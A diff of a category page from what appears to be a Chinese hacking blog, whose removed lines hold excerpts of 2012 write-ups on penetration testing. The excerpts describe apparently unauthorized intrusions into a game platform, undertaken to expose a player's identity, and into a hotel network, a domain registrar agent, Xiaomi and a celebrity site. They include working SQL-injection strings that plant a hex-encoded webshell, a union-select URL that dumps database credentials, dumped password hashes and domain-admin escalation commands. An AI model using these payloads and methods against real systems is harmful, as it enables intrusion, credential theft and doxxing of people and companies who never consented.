@@ -1,281 +1,270 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Category: 渗透测试 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Category: 渗透测试 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Category: 渗透测试 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="category-icon">渗透测试</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-24T16:30:05.000Z" itemprop="datePublished">
-          2012-12-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/社工/'>社工</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/958.seo/">渗透某页游平台</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><p>作者：9999@f4ck</p>  <p>0x01.起因—为了部落</p>  <p>0x02.踩点—硬柿子</p>  <p>0x03.主站碰壁—鼻青脸肿</p>  <p>0x04.分站进行时—未战即降</p>  <p>0x05.僵局中闪现突破口—完成任务</p>  <p>0x06.扩大战果遇奇葩—步步为营</p>  <p>0x07.总结—耐心,恒心,细心</p>  <p><b>0x01. </b><b>起因..</b></p>  <p>一个朋友玩这个平台的某游戏, 跟以后生骂起来了, 找我帮忙搞出这人资料.. </p>  <p><b>0x02. </b><b>踩点</b></p>  <p>先随便看了看, 小收集一下资料.</p>  <p>主站连接全为phtml文件, 同IP有N个平台, 全是这家公司开的, 还有个开服表的站, 推送新开服内容全是其旗下平台的.. 恩.. 这个策略不错..</p>  <p>有个论坛, 每个平台指向的论坛地址不同, logo不同, 但是整合了ucenter的, 所以数据是相同的, dz x1.5架设, 同段不同服, [IP尾数差两位]</p>  <p>所有论坛地址加ucenter自动跳转同一个域名ucenter.<strong><strong>.com</p>  <p>恩, 目测创始站. Google下site:</strong></strong>.com inurl:php|asp|aspx|jsp, 出来的都是论坛, 语句改为site:www.<strong><strong>.com inurl:php|asp|aspx|jsp 噢. </p>  <p>Aucun document ne correspond aux termes de recherche spécifiés (<b>site:</strong></strong>.com inurl:php|asp|aspx|jsp</b>). 什么都没有..</p>  <p>主站于其他平台为同一服务器.</p>  <p>Hscan扫两个ip皆只开了80端口. http banner返回nginx, </p>  <p><a href="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image002.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image002_thumb.jpg" width="279" height="137" /></a></p>  <p>测试文件尾名phtml phtmL, php pHp 确定都是<a href="http://ha.cker.in/tag/Linux" target="_blank">linux</a>服务器, </p>  <p>因未返回<a href="http://ha.cker.in/tag/nginx" target="_blank">nginx</a>版本, 继续测试<a href="http://ha.cker.in/tag/nginx" target="_blank">nginx</a>解析漏洞/.php, %00.php都失败. [两台服务器都测试了]</p>  <p>扫后台蛋都没扫出来.. 蛋开始隐隐作痛了..</p>  <p><b>0x03. </b><b>主站碰壁</b></p>  <p>在继续看主站.. </p>  <p>新闻和公共的连接方式都是</p>  <p><a href="http://www.****.com/index/news/gonggao/1103.phtm">http://www.****.com/index/news/gonggao/1103.phtm</a></p>  <p><a href="http://www.****.com/index/news/news/4103.phtm">http://www.****.com/index/news/news/4103.phtm</a></p>  <p>这样的, 像是htacsse rewrite了.</p>  <p>打开</p>  <p><a href="http://www.****.com/index/news">http://www.****.com/index/news</a></p>  <p><a href="http://www.****.com/index/">http://www.****.com/index/</a></p>  <p>都返回404, htacsse重定向没得跑了.</p>  <p>继续测试</p>  <p><a href="http://www.****.com/index/news/gonggao/1103-1.phtm">http://www.****.com/index/news/gonggao/1103-1.phtm</a></p>  <p>失败, cookie值中无可利用方向.</p>  <p>查看二级域名, 看看能不能有个admin.<strong><em>.com之类的后台管理地址. 唉.. 只有www和bbs..</p>  <p>在看看论坛吧, 顺便开始尝试<a href="http://ha.cker.in/tag/社工" target="_blank">社工</a>..进入公告发布板块看看管理员账户名, 同时</p>  <p><a href="http://whois.domaintools.com/*">http://whois.domaintools.com/*</a></em></strong>.com 一下看看注册域名和管理域名的人的资料.</p>  <p>都是domain@<em>**</em>.com …而且</p>  <p>Email Search: [这是这个email的图片]is associated with about <b>23 domains</b></p>  <p>23个域名.. 估计其他那些平台也都是这个邮箱注册的了..</p>  <p>在确定一下,随便查了几个其他平台的域名资料.. 果然都是这个邮箱…</p>  <p>资料填写也都是公司地址, 电话为座机, 和官网上的联系我们的号码是同样的.</p>  <p>蛋.. 你肿么了..</p>  <p><b>0x04.</b><b>分站进行时</b></p>  <p>公告板块翻了10几页, 发布公告人有13个以上.. ID都是GM0001-GM0024, ID都是20W+的.. 身份是编辑.. 用户组也改了名, 鼠标放到编辑二字上, 连接地址为home.php?mod=spacecp&amp;ac=usergroup&amp;gid=22 哦.. 因为dz从低级用户到管理员的groupID总共就10几个, 印象中.. 所以应该新建的用户组.. 不知权限如何.. 但估计很小..</p>  <p>点击名字查看资料却没有权限, 也懒得注册号去看, 因为应该还是没有权限的.. </p>  <p>这里就给个小tip, 也不是什么漏洞, 算是代码过滤不严谨吧. 是前段时间无意中发现的,.</p>  <p>———————————–Tip开始———————————–</p>  <p>Dz很多版本, 具体没有测试, 就是未注册用户和普通用户是没有权限查看其他用户资料的.</p>  <p>就拿官网举例吧, 公告发布人有个<a href="http://www.discuz.net/thread-2744369-1-1.html"></a><cite>Cnteacher</cite>, ID是859, groupID也是1,即管理员权限. 想进入空间看资料, <a href="http://www.discuz.net/home.php?mod=space&amp;uid=859">http://www.discuz.net/home.php?mod=space&amp;uid=859</a>, 却显示’请先登录后才能继续浏览’</p>  <p><a href="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image004.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image004_thumb.jpg" width="573" height="498" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/958.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">
-          2012-12-09
-      </time>
-    
-    
-    | 
-    <a href='/tag/Webshell/'>Webshell</a>,
-    
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/952.seo/">对国外某hotel的内网域渗透案例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br />首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370" /></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br /><a href="http://www.pentesting.cc/test.aspx?id=1">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br />Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</p>            <p>test.aspx?id=1;declare/</strong>/@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>            <p>test.aspx?id=1;insert/</strong>/into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125" /></a>    <br />如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br />在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*</strong>ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </p>            <p>br</em></strong>ez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </p>            <p>hm</em></strong>o:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br />dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/952.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/958.seo/" title="渗透某页游平台" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-07T06:42:03.000Z" itemprop="datePublished">
-          2012-12-07
-      </time>
+    <h1 itemprop="name">渗透某页游平台</h1>
     
-    
-    | 
-    <a href='/tag/神器/'>神器</a>,
-    
-    <a href='/tag/ARP/'>ARP</a>,
-    
-    <a href='/tag/劫持/'>劫持</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/951.seo/">深夜劫持雾隐技术小组</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者:Noseay|Roc@哈客部落   <br />粉丿丶兜兜    <br />转载请注明作者以及出处,谢谢</p>  <p>下午看见大牛<a href="http://ha.cker.in/tag/ARP" target="_blank">ARP</a>雾隐技术小组在群发,.所以手痒,打算被ARP的时候去欺骗一下万网的蝈蝈,电话过去,想说域名被人劫持了,喊他重置下密码,谁知道问这问那的,最后却告诉我页面恢复了..无奈之下,万网的蝈蝈告诉了我代理商的电话和手机,百度之    <br />发现了该代理商的网站,用遇见蝈做的<a href="http://ha.cker.in/tag/神器" target="_blank">神器</a>扫了下</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001_thumb.png" width="574" height="407" /></a></p>  <p>发现旁站挺多的,就随便拿个站下手吧,果断默认密码,上了个一句话</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002_thumb.png" width="574" height="387" /></a></p>  <p>在上一个webshell,提权ing….   <br />拿下服务器后,把代理商的站脱了个光都没发现里面该黑阔注册的域名    <br />无奈之下,只有在服务器里乱逛,突然想到whois信息里的dns是NS1.xxxxxx.COM    <br />看了下服务器里,也有这个站xx.xxxxxx.com    <br />首页看了一下数据库、发现有好多关于域名的！</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/951.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-12-24T16:30:05.000Z" itemprop="datePublished">2012-12-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-11-24T12:47:07.000Z" itemprop="datePublished">
-          2012-11-24
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/小米/'>小米</a>,
-    
-    <a href='/tag/密码/'>密码</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/947.seo/">小米科技成功渗透进内部网络</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>By Jannock@wooyun</p>  <p>简要描述：</p>  <p>首先   <br /><a href="http://www.wooyun.org/bugs/wooyun-2010-03608">http://www.wooyun.org/bugs/wooyun-2010-03608</a>    <br />对这位兄弟表示羡慕嫉妒。正好今天有空，再一次对小米科技的网络进行<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>。    <br />说实话，发表这篇东西时，表示有点害怕，已经不是在想能不能获取手机的问题了。    <br />本次渗透只进行到进入内部网络与某官网服务器。本次<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>很值得用统一<a href="http://ha.cker.in/tag/密码" target="_blank">密码</a>的人思考。</p>  <p>详细说明：</p>  <p>首先从某分站<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>点开始    <br /><a href="http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot">http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot</a>    <br />些注入点表示已经通知过官方，但可以是已经弃用的部分网站，所以一直还没处理。于是<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>就从此处开始。    <br />由于是root ,拿shell <a href="http://xshare.api.xiaomi.com/rso/1.php">http://xshare.api.xiaomi.com/rso/1.php</a></p>  <p><a href="http://img.cker.in/de675513837a_432C/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/de675513837a_432C/clip_image001_thumb.jpg" width="672" height="460" /></a></p>  <p>事实也证明，此服务器没什么用途，和官方<a href="http://ha.cker.in/tag/电商" target="_blank">电商</a>网络跟离差远。不过此处还是存在几个分站网站。    <br />连续数据库    <br />数据库中没什么可以关注的信息，最具重要的数据库是：ucenter ，当然，这个是弃用的数据库，用户数据不是最新，但是可以作为很好的渗透的<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a>。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/947.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/952.seo/" title="对国外某hotel的内网域渗透案例" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-11-24T12:30:54.000Z" itemprop="datePublished">
-          2012-11-24
-      </time>
+    <h1 itemprop="name">对国外某hotel的内网域渗透案例</h1>
     
-    
-    | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/检测/'>检测</a>,
-    
-    <a href='/tag/权限/'>权限</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/946.seo/">友情检测张柏芝官方网站全过程</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>声明：原创文章，转载请注明来自哈客部落(<a href="http://www.hake.cc/">www.hake.cc</a>），违者必究！    <br />from: <a href="http://www.hacke.cc/">www.hacke.cc</a>    <br />今天一时兴起,想太阳个明星的官网玩玩    <br />这不,心里一思量就想到了我们的柏芝姐姐从前,有一个美女…. 吖的。跑题了,, 回来    <br />我们继续~~    <br />百度找到张柏芝的官网    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image001_thumb.png" width="320" height="92" /></a>    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image003_thumb.jpg" width="620" height="243" /></a>    <br />简略的踩点了一下。发现大部分都是html的静态页面,也没办法下手。看这外观又有点像某个cms的样子。    <br />随即想看看googlehack能不能找到后台地址。查出程序版本..好对症下药！    <br /><a href="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/9bfa1a9ff5cd_3F1B/clip_image005_thumb.jpg" width="620" height="386" /></a>    <br />看到了把，懂得人都知道这是目录遍历。同时还发现了网站有用aspx的语言程序。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/946.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">2012-12-09</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-11-19T08:40:25.000Z" itemprop="datePublished">
-          2012-11-19
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/939.seo/">对某餐饮管理服务有限公司网络渗透</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
